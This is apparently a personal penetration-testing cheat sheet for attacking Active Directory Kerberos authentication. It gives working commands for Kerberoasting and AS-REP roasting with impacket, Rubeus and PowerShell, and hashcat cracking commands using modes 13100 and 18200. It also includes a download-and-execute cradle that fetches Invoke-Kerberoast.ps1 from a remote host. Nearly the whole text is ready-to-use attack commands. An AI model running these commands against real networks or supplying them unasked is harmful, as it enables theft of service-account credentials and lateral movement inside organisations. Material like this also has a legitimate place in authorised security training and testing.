## Kerberoasting (TGS-REP)
### In Linux:
```
To perform Kerberoasting
sudo impacket-GetUserSPNs -request -dc-ip [ip of domain controller] -outputfile hashes.kerberoast [domainname/user]

if clock skew error: https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

faketime "$(ntpdate -q [domain] | cut -d ' ' -f 1,2)" /bin/impacket-GetUserSPNs -request -dc-ip [ip of domain controller] -outputfile hashes.kerberoast [domainname/user]
------------------------------------------------------
Mode for TGS-REP in Hashcat is 13100

To crack the TGS-REP hash:
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
------------------------------------------------------
### In Windows:
```
To perform Kerberoasting:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

Rubeus.exe binary is in ~/Documents/tools

Crack it with hashcat afterwards

OR
If want to lateral movement to another service account,
1. Get the file Get-SPN.ps1 into the system
2. .\Get-SPN.ps1 to get the service principal names
Now to request and store the ticket for the service account to lateral movement,
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN Name'

To extract the hash:
iex(new-object net.webclient).downloadString('http://$ip:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
```
## AS-REP Roasting (Kerberos)
### In Kali:
```
To perform AS-REP roasting
impacket-GetNPUsers -dc-ip [ip of domain controller]  -request -outputfile hashes.asreproast [domainname/user]
------------------------------------------------------
Mode for AS-REP in Hashcat is 18200

To crack the AS-REP Hash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

can use other rules if you want but best64 is recommended
```
------------------------------------------------------
### In Windows:
```
To perform AS-REP roasting
.\Rubeus.exe asreproast /nowrap

Rubeus.exe binary is in ~/Documents/tools

Crack it with hashcat afterwards
```